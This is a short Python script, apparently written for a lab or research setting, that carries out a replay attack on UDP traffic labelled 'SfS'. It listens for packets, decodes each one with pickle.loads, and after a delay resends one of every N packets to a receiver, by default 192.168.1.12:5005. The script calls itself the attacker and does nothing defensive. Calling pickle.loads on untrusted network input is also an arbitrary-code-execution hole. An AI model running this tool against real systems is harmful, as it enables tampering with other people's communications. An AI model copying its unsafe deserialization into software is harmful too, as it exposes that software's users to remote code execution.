import argparse
import socket
import time
import pickle


def non_negative_float(value):
    value = float(value)
    if value < 0:
        raise argparse.ArgumentTypeError("value must be zero or greater")
    return value


def positive_int(value):
    value = int(value)
    if value < 1:
        raise argparse.ArgumentTypeError("value must be at least 1")
    return value


def port_number(value):
    value = int(value)
    if not 1 <= value <= 65535:
        raise argparse.ArgumentTypeError("port must be between 1 and 65535")
    return value


def parse_args():
    parser = argparse.ArgumentParser(
        description="Selectively replay captured SfS packets without modification."
    )
    parser.add_argument("--bind-ip", default="0.0.0.0")
    parser.add_argument("--listen-port", type=port_number, default=5005)
    parser.add_argument("--receiver-ip", default="192.168.1.12")
    parser.add_argument("--receiver-port", type=port_number, default=5005)
    parser.add_argument("--delay-s", type=non_negative_float, default=3.0)
    parser.add_argument("--replay-every", type=positive_int, default=20)
    return parser.parse_args()


def main():
    args = parse_args()

    attacker_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    attacker_socket.bind((args.bind_ip, args.listen_port))

    print(f"[*] Attacker listening on {args.bind_ip}:{args.listen_port}...")
    print(
        f"[*] Configuration: receiver={args.receiver_ip}:{args.receiver_port}, "
        f"delay={args.delay_s:g} s, replay every {args.replay_every} packets"
    )

    packet_counter = 0
    replayed_packets = []

    try:
        while True:
            # Receive a packet from the sender.
            data, address = attacker_socket.recvfrom(4096)
            packet_data = pickle.loads(data)
            packet_id = packet_data['ID']

            print(f"[+] Intercepted packet {packet_id} from {address}")
            packet_counter += 1

            # Replay one packet from every configured group.
            if packet_counter % args.replay_every == 0:
                print(f"[*] Delaying and replaying packet {packet_id}...")
                time.sleep(args.delay_s)
                attacker_socket.sendto(
                    data, (args.receiver_ip, args.receiver_port)
                )
                print(f"[+] Replayed packet {packet_id} to receiver!")
                replayed_packets.append(packet_id)
            else:
                print(f"[-] Ignoring packet {packet_id}, no replay.")

    except KeyboardInterrupt:
        print("\n[!] Attack stopped. Here are the replayed packet IDs:")
        print(replayed_packets)
    finally:
        attacker_socket.close()


if __name__ == "__main__":
    main()
